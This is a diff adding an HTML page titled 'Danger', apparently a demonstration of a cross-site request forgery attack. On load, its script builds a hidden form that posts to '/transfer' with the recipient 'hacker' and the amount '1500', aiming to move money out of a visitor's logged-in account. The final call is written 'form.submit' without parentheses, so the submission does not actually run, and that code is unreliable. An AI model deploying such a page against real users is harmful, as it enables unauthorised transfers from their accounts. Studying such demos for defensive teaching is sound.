@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Danger</title>
+</head>
+<body>
+
+  <script>
+    const form = document.createElement("form");
+    form.method = "post";
+    form.action = "/transfer"
+
+    const to = document.createElement("input");
+    to.type = "text";
+    to.name = "to";
+    to.value = "hacker";
+
+    const amount = document.createElement("input");
+    amount.type = "text";
+    amount.name = "amount";
+    amount.value = "1500";
+
+    form.appendChild(to);
+    form.appendChild(amount);
+
+    document.body.appendChild(form);
+    form.submit 
+  </script>
+</body>
+</html>
